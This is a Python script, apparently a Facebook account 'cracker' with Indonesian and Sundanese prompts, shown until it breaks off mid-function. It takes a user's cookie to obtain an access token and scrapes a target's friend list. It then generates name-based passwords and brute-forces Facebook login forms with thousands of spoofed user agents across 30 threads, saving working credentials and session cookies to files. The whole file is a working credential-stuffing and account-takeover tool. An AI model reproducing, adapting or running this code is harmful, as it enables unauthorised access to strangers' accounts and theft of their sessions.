##+++++++++++++++[IMPORT MODULE]+++++++++++++++##
import re
import time
import sys
import os
import random
import json
import requests
import lxml
import threading
from requests import Session
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as thread
from rich.panel import Panel as nel
from rich.console import Console
from rich.tree import Tree
from rich.prompt import Prompt
from fake_useragent import UserAgent
##+++++++++++++++[GLOBAL VARIABLE]+++++++++++++++##
dump = []
ugen = []
method = []
loop = 0
ok = 0
cp = 0
console = Console()
##+++++++++++++++[SETTING WARNA]+++++++++++++++##
A1='\x1b[30;5m'
B1='\x1b[34;5m'
C1='\x1b[36;5m'
H1='\x1b[32;5m'
K1='\x1b[33;5m'
M1='\x1b[31;5m'
U1='\x1b[35;5m'
P1='\x1b[37;5m'
##+++++++++++++++[WELCOME MY BANNER]+++++++++++++++##
def banner():
  text = '''[bold cyan]
  /\/|       /\/|  _____    //\     __
[bold red] |/\/_  ____|/\/ [bold green] / ___ \  |/_\|  _/_/_
 / _` ||_  / /_\ / / __| \| ____|| ____|
| (_[bold purple]| | / / / [bold yellow]_ \ | (__   |  _|_ |  _|_
 \__,_|/___/_/ \_\ \___| /|_____||_____|
                  \_____/ \n'''
  panel = nel.fit(text,style='bold yellow',title='〆zéʁɑ∽ʇomcɑʇ')
  console.print(panel)
##+++++++++++++++[LOGIN COOKIES]+++++++++++++++##
def login():
  os.system('clear')
  banner()
  text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Masukan Cookies Fresh Pastikan Bukan Akun Hasil Crack\n[bold cyan][[bold white]+[bold cyan]][bold white] Gunakan Kiwi Browser Dan Extension Get Token Cookies\n[bold cyan][[bold white]+[bold cyan]][bold white] Untuk Mengambil Cookies Anda Dan Login Di Tools Ini'''
  panel = nel.fit(text,style='bold yellow',title='user information')
  console.print(panel)
  coki = Prompt.ask('[bold cyan][[bold white]+[bold cyan]][bold white] asupkeun cookies Anjeun >> ')
  try:
    try:
      url_login = requests.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':coki}).text
      re_act = re.search('act=(.*?)&nav_source',str(url_login)).group(1)
      url_act = requests.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={re_act}&nav_source=no_referrer',cookies={'cookie':coki}).text
      token = re.search('accessToken="(.*?)"',str(url_act)).group(1)
      open('.MyCok.txt','w').write(coki)
      open('.MyTok.txt','w').write(token)
      text = f'''[bold cyan][[bold white]token[bold cyan]][bold white] {token}'''
      panel = nel.fit(text,style='bold yellow',title='Login Sukses')
      console.print(panel)
      time.sleep(5)
      exit()
    except requests.exceptions.ConnectionError:
      time.sleep(10)
      exit()
  except Exception as e:
    text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Login Failed Please Check You Cookies'''
    panel = nel.fit(text,style='bold yellow',title='Problem Cookies')
    console.print(panel)
    time.sleep(5)
    exit()
##+++++++++++++++[PUBLIC ID]+++++++++++++++##
def public():
  try:
    token = open('.MyTok.txt','r').read()
    cook = open('.MyCok.txt','r').read()
  except FileNotFoundError:
    text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Cookies NotFoundError Please Login New Session'''
    panel = nel.fit(text,style='bold yellow',title='Error')
    console.print(panel)
    time.sleep(5)
    login()
  try:
    info = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+token,cookies={'cookie':cook}).json()
    _id = info['id']
    _user = info['name']
  except KeyError:
    try:os.remove('.MyCok.txt');os.remove('.MyTok.txt')
    except:pass
    text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Cookies Expired Or damaged'''
    panel = nel.fit(text,style='bold yellow')
    console.print(panel)
    time.sleep(5)
    login()
  os.system('clear')
  banner()
  text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Welcome To My Project Cracker Facebook Id'''
  panel = nel.fit(text,style='bold yellow',title='Welcome')
  console.print(panel)
  console.print(nel.fit('[bold cyan][[bold white]id[bold cyan]][bold white] : {}\n[bold cyan][[bold white]name[bold cyan]][bold white] : {}'.format(_id,_user),style='bold yellow',title='victim account'))
  text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Salin Url Postingan Foto\n[bold cyan][[bold white]+[bold cyan]][bold white] Untuk Mengambil Id Target'''
  panel = nel.fit(text,style='bold yellow')
  console.print(panel)
  ids = Prompt.ask('[bold cyan][[bold white]+[bold cyan]][bold white] Lebetkeun Target Public ID >> ')
  graph_teman(ids,"",{'cookie':cook},token)
  setting()
##+++++++++++++++[GRAPH DUMP FRIENDS]+++++++++++++++##
def graph_teman(ids,fields,cookie,token):
  try:
    usr = UserAgent()
    head = usr.random
    if len(dump)==0:
      params = {'access_token': token,
      'fields': 'id,name,friends.fields(id,name,birthday)'}
    else:
      params = {'access_token': token,
      'fields': f'id,name,friends.fields(id,name,birthday).after({fields})'}
    url = requests.get('https://graph.facebook.com/{}'.format(ids),params=params,headers={'user-agent':head},cookies=cookie).json()
    for x in url['friends']['data']:
      dump.append(x['id']+'|'+x['name'])
      sys.stdout.write(f'\r{C1}[{P1}+{C1}]{P1} Sukses Dump Id >> : {len(dump)}')
      sys.stdout.flush()
    graph_teman(ids,url['friends']['paging']['cursors']['after'],cookie,token)
  except Exception as e:
    pass

def setting():
  console.print('\n')
  text = '''[bold cyan][[bold white]01[bold cyan]][bold white] Regular Method\n[bold cyan][[bold white]02[bold cyan]][bold white] Validate Method'''
  panel = nel.fit(text,style='bold yellow',title='Method Setting')
  console.print(panel)
  ch = input(f'{C1}[{P1}+{C1}]{P1} Choice Method Crack ')
  if ch in ['01','1']:
    method.append('regular')
  elif ch in ['02','2']:
    method.append('validate')
  else:
    method.append('regular')
  password()
##+++++++++++++++[SETTING PASSWORD]+++++++++++++++##
def password():
  text = '''[bold cyan][[bold white]+[bold cyan]][bold white] Result Sukses Save[bold green] /assets/OK\n[bold cyan][[bold white]+[bold cyan]][bold white] Result Failed Save[bold yellow] /assets/CP\n[bold cyan][[bold white]+[bold cyan]][bold white] Mode Pesawat Disetiap 200/ids'''
  panel = nel.fit(text,style='bold yellow')
  console.print(panel)
  with thread(max_workers=30) as hacked:
    try:
      for dt in dump:
        pwx = []
        idf = dt.split('|')[0]
        xbet = dt.split('|')[1]
        dpn = xbet.split(' ')[0]
        blk = xbet.split(' ')[-1]
        if len(xbet)<=3:
          if len(dpn)<=3:
            pass
          else:
            pwx.append(xbet)
            pwx.append(dpn+'123')
            pwx.append(dpn+'1234')
            pwx.append(dpn+'12345')
            pwx.append(dpn+'123456')
            pwx.append(dpn+'321')
            pwx.append(dpn+'11')
            pwx.append(dpn+'12')
            pwx.append(dpn+'21')
            pwx.append(dpn+'22')
            pwx.append(dpn+'23')
            pwx.append(dpn+'24')
            pwx.append(dpn+'25')
            pwx.append(dpn+'26')
        else:
          if len(dpn)<=3 or len(xbet)<=10:
            lengkap = dt.split()
            bagian1 = lengkap[0]
            bagian2 = lengkap[1] if len(lengkap)>2 else ""
            bagian3 = lengkap[-1]
            pwx.append(bagian3+'123')
            pwx.append(bagian3+'1234')
            pwx.append(bagian3+'12345')
            pwx.append(bagian3+'123456')
            pwx.append(bagian3+'321')
            pwx.append(bagian2+'123')
            pwx.append(bagian2+'1234')
            pwx.append(bagian2+'12345')
            pwx.append(bagian2+'123456')
            pwx.append(bagian1+'123')
            pwx.append(bagian1+'1234')
            pwx.append(bagian1+'1234')
            pwx.append(bagian1+'123456')
            pwx.append(xbet)
            pwx.append(blk+'12')
            pwx.append(blk+'123')
            pwx.append(blk+'1234')
            pwx.append(blk+'12345')
            pwx.append(blk+'123456')
            pwx.append(blk+'321')
            pwx.append(blk+'11')
            pwx.append(blk+'21')
            pwx.append(blk+'22')
            pwx.append(blk+'23')
            pwx.append(blk+'24')
            pwx.append(blk+'25')
            pwx.append(blk+'26')
          else:
            pwx.append(dpn+'12')
            pwx.append(dpn+'123')
            pwx.append(dpn+'1234')
            pwx.append(dpn+'12345')
            pwx.append(dpn+'123456')
            pwx.append(dpn+'321')
            pwx.append(dpn+'11')
            pwx.append(dpn+'21')
            pwx.append(dpn+'22')
            pwx.append(dpn+'23')
            pwx.append(xbet)
        if 'regular' in method:
          hacked.submit(crack1,idf,pwx)
        elif 'validate' in method:
          hacked.submit(crack2,idf,pwx)
        else:
          hacked.submit(crack1,idf,pwx)
    except Exception as e:
      print(e)
  console.print(nel.fit('[bold cyan][[bold white]+[bold cyan]][bold white] Result Crack >> : [bold green]OK>{} [bold yellow]CP>{}'.format(ok,cp),style='bold yellow',title='selesai'))
##+++++++++++++++[GENERATE USERAGENT]+++++++++++++++##
for _xxx in range(1000):
  dc = random.randrange
  _a= 'Mozilla/5.0 (Linux; Android'
  _b= f'Infinix X{dc(300,891)}B'
  _c= f'Build/QP1A.{dc(194522,1301821)}.020; wv)'
  _d= 'AppleWebKit/537.36'
  _e= f'(KHTML, like Gecko) Version/{dc(1,30)}.{dc(1,20)}'
  _f= f'Chrome/{dc(121,300)}.{dc(1,60)}.{dc(1281,4271)}.{dc(123,317)}'
  _g= 'Mobile Safari/537.36'
  agent = f'{_a} U; {dc(1,15)}; en-US; {_b} {_c} {_d} {_e} {_f} {_g}'
  ugen.append(agent)
for _bbb in range(1000):
  rr = random.randint
  ax= 'Mozilla/5.0 (Linux; U;'
  bx= 'zh-CN; Infinix X682B'
  cx= 'Build/MRA58K) AppleWebKit/537.36'
  dx= '(KHTML, like Gecko) Version/4.0'
  ex= f'Chrome/{rr(57,300)}.{rr(1,60)}.{rr(1291,4000)}.{rr(100,400)}'
  fx= f'HiBrowser/{rr(1,30)}.{rr(1,15)}.{rr(1,6)}.{rr(1,22)} UWS/ Mobile'
  gx= 'Safari/537.36'
  agent1 = f'{ax} Android {rr(1,20)}; {bx} {cx} {dx} {ex} {fx} {gx}'
  ugen.append(agent1)
for _xcc in range(1000):
  df = random.randint
  xdc1= f'Mozilla/5.0 (Linux; U; Android {df(1,20)}; fr-fr; Infinix X682B Build/QP1A.{df(1291,23718)}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{df(96,200)}.{df(0,12)}.{df(2197,4271)}.{df(197,319)} Mobile Safari/537.36 PHX/{df(1,181)}.{df(97,219)}'
  xdc2= f'Mozilla/5.0 (Linux; Android {df(1,100)}; SAMSUNG SM-A356B/A356BXXU1AXBB) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{df(1,39)}.{df(1,20)} Chrome/{df(124,200)}.{df(0,90)}.{df(2817,49716)}.{df(129,391)} Mobile Safari/537.36'
  xdc3= f'Mozilla/5.0 (Linux; Android {df(1,30)}; CPH{df(1942,20312)}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{df(1,30)}.{df(1,20)} Chrome/{df(110,300)}.{df(0,50)}.{df(1281,4261)}.{df(121,200)} Mobile Safari/537.36'
  xdc4= f'(SMART-TV;Linux;Tizen{df(1,9)}.{df(1,20)}) AppleWebkit/538.1 (KHTML,likeGecko) SamsungBrowser/{df(1,9)}.{df(1,6)} TVSafari/538.1'
  cyank = random.choice([xdc1,xdc2,xdc3,xdc4])
  ugen.append(cyank)
for _zeratomcat in range(10000):
  dc = random.randint
  merk = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  xua1 = f'Mozilla/5.0 (SMART-TV; Linux; Tizen {dc(1,9)}.{dc(1,6)}) AppleWebKit/{dc(500,700)}.{dc(100,300)} (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/{dc(60,200)}.{dc(0,50)}.{dc(3000,6000)}.{dc(84,300)} Safari/{dc(500,700)}.{dc(100,300)}'
  xua2 = f'Mozilla/5.0 (Linux; {merk}; Philips; en) AppleWebKit/{dc(1,500)}.{dc(1,100)}+ (KHTML, like Gecko) Safari/{dc(400,600)}.{dc(1,90)}+ LG/{dc(1,9)}.{dc(1,6)} ATSC/QAM'
  xua3 = f'Mozilla/5.0 (Linux; Android {dc(1,100)}; Infinix X688C) AppleWebKit/{dc(518,791)}.{dc(1,97)} (KHTML, like Gecko) Chrome/{dc(1,200)}.{dc(0,31)}.{dc(4319,5917)}.{dc(97,218)} Mobile Safari/{dc(518,791)}.{dc(1,97)}'
  xua4 = f'Mozilla/5.0 (Linux; Android {dc(1,100)}; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{dc(1,30)}.{dc(1,9)}.{dc(1,20)}.{dc(19,49)} Chrome/{dc(91,318)}.{dc(91,318)}.{dc(121,178)}.{dc(18,219)} Mobile Safari/537.36'
  xua5 = f'Mozilla/5.0 (Linux; Android {dc(1,100)}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{dc(19,219)}.{dc(0,90)}.{dc(918,1929)}.{dc(318,419)} Mobile Safari/537.36 OPR/{dc(69,311)}.{dc(9,27)}.{dc(3919,6817)}.{dc(59188,97188)}'
  xua6 = f'Mozilla/5.0 (Linux; Android {dc(1,20)}; {merk}{dc(218,978)}{merk}) AppleWebKit/{dc(300,600)}.{dc(10,99)} (KHTML, like Gecko) Chrome/{dc(21,39)}.{dc(91,319)}.{dc(1911,3199)}.{dc(219,391)} Mobile Safari/{dc(300,600)}.{dc(10,99)}'
  xua7 = f'Mozilla/5.0 (Linux; Android {dc(1,19)}; Redmi Note 8 Build/RKQ1.{dc(192821,3139291)}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{dc(19,219)}.{dc(98,319)}.{dc(918,2918)}.{dc(19,219)} Mobile Safari/537.36 GoogleApp/{dc(31,91)}.{dc(19,39)}.{dc(9,18)}.{dc(9,18)}.arm64'
  xua8 = f'Mozilla/5.0 (Linux; Android {dc(198,889)}; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{dc(96,200)}.{dc(0,90)}.{dc(0,60)}.{dc(0,90)} Mobile Safari/537.36 YaaniBrowser/{dc(19,98)}.{dc(9,31)}.{dc(9,66)}'
  xua9 = f'Mozilla/5.0 (Linux; Android {dc(1,219)}; Redmi Note 8 Build/QKQ1.{dc(198182,3192819)}.002; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.69 Mobile Safari/537.36 BingSapphire/24.8.{dc(1918,31918291)}'
  xua10 = random.choice([f'Mozilla/5.0 (Linux; U; Android {dc(1,31)}; zh-cn; M2007J17C Build/SKQ1.{dc(19432,319819)}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/{dc(19,29)} Chrome/{dc(199,319)}.{dc(0,87)}.{dc(19,319)} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.1.8 swan-mibrowser',f'Mozilla/5.0 (Linux; Android 11; M2007J17C Build/RKQ1.{dc(19,3191829)}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/{dc(19,319)}.{dc(219,419)} SP-engine/{dc(2,9)}.{dc(9,32)} baiduboxapp/{dc(12,93)}.{dc(9,98)}.{dc(98,319)}.{dc(19,319)} (Baidu; P1 11) NABar/{dc(1,9)}.{dc(7,21)}',f'Mozilla/5.0 (Linux; Android 10; Redmi Note 9S Build/QKQ1.{dc(193819,39182919)}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{dc(1,9)}.{dc(9,31)} Chrome/{dc(1918,31928)}.{dc(928,31199)}.{dc(19,319)}.{dc(2918,2919)} Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/362.0.0.8.108;]','Mozilla/5.0 (Linux; U; Android 12; en-us; Redmi Note 9S Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/1.8.1','Mozilla/5.0 (Linux; Android 11.0; Redmi Note 9S Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Mobile Safari/537.36voicefxp fxpapp','Mozilla/5.0 (Linux; U; Android 10; pt-br; Redmi Note 9S Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.7.2','Mozilla/5.0 (Linux; Android 14; 2312CRNCCL Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/412.0.0.8.106;]','Mozilla/5.0 (Linux; Android 7.1.2; Redmi Y1 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.115 Mobile Safari/537.36 GSA/12.28.8.23.arm64','Mozilla/5.0 (Linux; Android 11; MiTV-AYFR0 Build/RTT0.211222.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.23 YaBrowser/24.1.2.221 (lite) TV Safari/537.36','Mozilla/5.0 (Linux; Android 14; 24040RN64Y Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.170 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/472.0.0.45.79;] FBNV/1',
  'Mozilla/5.0 (Linux; Android 11; MiTV-AYFR0 Build/RTT0.211222.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 14; zh-cn; 2206123SC Build/UKQ1.231003.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.3.210708','Mozilla/5.0 (Linux; Android 14; 2312CRNCCL Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/412.0.0.8.106;]','Mozilla/5.0 (Linux; U; Android 14; en-us; 23117RK66C Build/UKQ1.230804.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 XiaoMi/MiuiBrowser/18.3.210611'])
  uaku = random.choice([xua1,xua2,xua3,xua4,xua5,xua6,xua7,xua8,xua9,xua10])
  ugen.append(uaku)
for zxcat in range(1000):
  rr = random.randint
  merk = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  ua1 = f'Mozilla/5.0 (Linux; Android {dc(1,100)}; {merk}{rr(1,999)}{merk}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{rr(1,90)}.{rr(1,30)} Chrome/{rr(121,931)}.{rr(0,30)}.{rr(1811,3991)}.{rr(91,219)} Mobile Safari/537.36'
  ua2 = f'Mozilla/5.0 (Linux; Android {rr(1,20)}.{rr(1,19)}; SM-J327W Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(60,90)}.{rr(88,281)}.{rr(98,1178)}.{rr(88,218)} Mobile Safari/537.36 SamsungBrowser/CrossApp/{rr(1,20)}.{rr(0,9)}.{rr(31,299)}'
  ua3 = f'Mozilla/5.0 (Linux; Android 7.0; Pixel {merk} Build/NRD91D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(39,318)}.{rr(0,9)}.2{rr(19,218)}.{rr(19,219)} Safari/537.36 [FB_IAB/FB4A;FBAV/98.0.0.18.70;]'
  ua4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.12(0x17000c2f) NetType/4G Language/zh_CN wechatdevtools qcloudcdn-xinan  uacq'
  ua5 = f'Mozilla/5.0 (Linux; Android 13; 22127RK46C Build/TKQ1.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(1,119)}.{rr(0,80)}.{rr(9,218)}.{rr(19,219)} Mobile Safari/537.36 XWEB/5127 MMWEBSDK/20230604 MMWEBID/7189 MicroMessenger/{rr(9,91)}.{rr(87,271)}.{rr(98,188)}.2400(0x28002639) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 qcloudcdn-xinan Request-Source=4 Request-Channel'
  ualgi = random.choice([ua1,ua2,ua3,ua4,ua5])
  ugen.append(ualgi)
samsung_gt_types = [f"GT{i}" for i in range(1, 1000)]
infinix_types = [f"Infinix{i}" for i in range(1, 1000)]
oppo_types = [f"Oppo{i}" for i in range(1, 1000)]
vivo_types = [f"Vivo{i}" for i in range(1, 1000)]
samsung_types = [f"SM-G{i}F" for i in range(1, 1000)]
philips = [f'Philips S{i}' for i in range(1,1000)]
GT1 = [f'GT-S{i}L' for i in range(3112,9711)]
GT2 = [f'GT-I{i}' for i in range(1945,2024)]
GT3 = [f'SGH-M{i}' for i in range(111,999)]
combined_list = samsung_gt_types + infinix_types + oppo_types + vivo_types + samsung_types
for model in combined_list:
  rr = random.randint
  xua1 = f'Mozilla/5.0 (Linux; Android 11; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rr(92,300)}.{rr(0,96)}.{rr(3287,4917)}.{rr(318,691)} Mobile Safari/537.36'
  xua2 = f'Mozilla/5.0 (Linux; Android {rr(1,100)}; {model} Build/PPR1.{rr(194522,981821)}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(0,200)}.{rr(0,20)}.{rr(3000,6000)}.{rr(213,401)} MQQBrowser/{rr(1,15)}.{rr(1,9)} TBS/{rr(121932,818218)} Mobile Safari/537.36 StApp/bb/{rr(1,20)}.{rr(0,9)}.{rr(1,20)}/android'
  xua3 = f'Mozilla/5.0 (Linux; Android {rr(1,100)}; {model} Build/QP1A.{rr(193181,971828)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{rr(1,9)}.{rr(1,6)} Chrome/{rr(80,422)}.{rr(0,100)}.{rr(3918,8617)}.{rr(131,981)} Mobile Safari/537.36 GTMobileApp/{rr(1,30)}.{rr(0,9)}.{rr(1,15)}'
  xua4 = f'Mozilla/5.0 (Linux; Android {rr(1,100)}; {model} Build/QP1A.{rr(192111,991811)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{rr(1,80)}.{rr(1,30)}Chrome/{rr(121,318)}.{rr(0,50)}.{rr(2198,3299)}.{rr(0,871)} Mobile Safari/537.36;(NATIVE_Android_v{rr(1921,9171)}.{rr(0,60)}.{rr(1,30)})'
  xua5 = f'Mozilla/5.0 (Linux; Android {rr(1,100)}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{rr(1,30)}.{rr(1,9)} Chrome/{rr(105,321)}.{rr(0,90)}.{rr(3211,6971)}.{rr(311,918)} Mobile Safari/537.36'
  xua6 = f'Mozilla/5.0 (SMART-TV; Linux; {model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{rr(1,60)}.{rr(0,30)} Chrome/{rr(123,311)}.{rr(0,60)}.{rr(2132,6818)}.{rr(181,318)} TV Safari/537.36 WilbertOS/{rr(9,31)}.{rr(98,321)}.{rr(9,81)}.{rr(31981,919121)}'
  xua7 = f'Mozilla/5.0 (Linux; U; Android {rr(1,9)}.{rr(9,12)}.{rr(1,6)}; en-US; {model} Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/{rr(1,20)}.{rr(1,9)} UCBrowser/{rr(10,90)}.{rr(0,60)}.{rr(1,40)}.{rr(111,999)} U3/{rr(1,10)}.{rr(1,9)}.{rr(0,6)} Mobile Safari/534.30'
  gku = random.choice([xua1,xua2,xua3,xua4,xua5,xua6,xua7])
  ugen.append(gku)
##+++++++++++++++[SETTING METHOD/HEADERS]+++++++++++++++##
def crack1(idf,pwx):
  global loop, ok, cp
  sys.stdout.write(f'\r{C1}[{P1}Steal{C1}]{P1} {loop}/{len(dump)} {H1}OK>{ok} {K1}CP>{cp}')
  sys.stdout.flush()
  ses = Session()
  agent = random.choice(ugen)
  usa = UserAgent()
  uka = usa.random
  rr = random.randint
  for pw in pwx:
    try:
      pw = pw.lower()
      head11 = {'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'cache-control': f'max-age={rr(1,100)}',
      'referer': 'https://business.facebook.com/business/loginpage/?next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_dfc&app=436761779744620&login_options%5B0%5D=FB&login_options%5B1%5D=SSO&is_work_accounts=1&config_ref=biz_login_tool_flavor_dfc',
      'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="8", "Google Chrome";v="8"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Chromium OS"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': agent,}
      link = parser(ses.get('https://business.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_dfc%26biz_login_source%3Dbiz_unified_f3_fb_login_button%26join_id%3Da50d3c49-1040-4f85-b8dd-b589e129462c',headers=head11).content,'html.parser')
      cari = link.find('form',method='post')

      data = {}
      for x in cari.find_all('input'):
        data.update({x.get('name'):x.get('value')})
      data.update({'email':idf,'pass':pw})

      head22 = {'authority': 'business.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'cache-control': f'max-age={rr(1,100)}',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://business.facebook.com',
      'referer': 'https://business.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_dfc%26biz_login_source%3Dbiz_unified_f3_fb_login_button%26join_id%3Da50d3c49-1040-4f85-b8dd-b589e129462c',
      'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="8", "Google Chrome";v="8"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Chromium OS"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': agent,}

      ses.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Fnav_ref%3Dbiz_unified_f3_login_page_to_dfc%26biz_login_source%3Dbiz_unified_f3_fb_login_button%26join_id%3Da50d3c49-1040-4f85-b8dd-b589e129462c&lwv=100',data=data,headers=head22)
      if 'c_user' in ses.cookies.get_dict().keys():
        ok+=1
        coki = (';').join([f'{key}={value}' for key,value in ses.cookies.get_dict().items()])
        with open('Data/OK/'+'C_user.txt','a') as m:
          m.write(f'{idf}|{pw}|{coki}\n')
        console.print('\n')
        tre = Tree('')
        tre.add(f'{H1}{idf}')
        tre.add(f'{H1}{pw}')
        tre.add(f'{H1}{coki}')
        console.print(tre)
        break
      elif 'checkpoint' in ses.cookies.get_dict().keys():
        cp+=1
        with open('Data/CP/'+'Checkpoint.txt','a') as c:
          c.write(f'{idf}|{pw}\n')
        console.print('\n')
        tre = Tree('')
        tre.add(f'{K1}{idf}')
        tre.add(f'{K1}{pw}')
        tre.add(f'{K1}{uka}')
        console.print(tre)
        break
      else:
        continue
    except requests.exceptions.ConnectionError:
      time.sleep(30)
  loop+=1

def crack2(idf,pwx):
  global loop, ok, cp
  sys.stdout.write(f'\r{C1}[{P1}zera{C1}]{P1} {loop}/{len(dump)} {H1}OK>{ok} {K1}CP>{cp}')
  sys.stdout.flush()
  dex = requests.Session()
  agent = random.choice(ugen)
  usp = UserAgent()
  used = usp.random
  dc = random.randint
  for pw in pwx:
    try:
      try:
        try:google = re.search('Chrome/(\d+)',str(agent)).group(1)
        except:google = '124'
        try:chrome = re.search('Chrome/(.*?)',str(agent)).group(1)
        except:chrome = '124.0.4356.213'
        try:android = re.search('Android (.*?)',str(agent)).group(1)
        except:android = '11'
        pw = pw.lower()
        hedere = {'authority': 'm.facebook.com',
        'accept': f'text/html,application/xhtml+xml,application/xml;q={dc(1,90)}.{dc(90,999)},image/avif,image/webp,image/apng,*/*;q={dc(1,80)}.{dc(80,999)},application/signed-exchange;v=b3;q={dc(1,70)}.{dc(70,999)}',
        'accept-language': f'id-ID,id;q={dc(1,90)}.{dc(90,999)},en-US;q={dc(1,80)}.{dc(80,999)},en;q={dc(1,70)}.{dc(70,999)}',
        'cache-control': f'max-age={dc(1,100)}',
        'dpr': f'{dc(1,100)}.{dc(100,999)}',
        'referer': 'https://www.ilovepdf.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="47", "Google Chrome";v="47"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"iOS"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
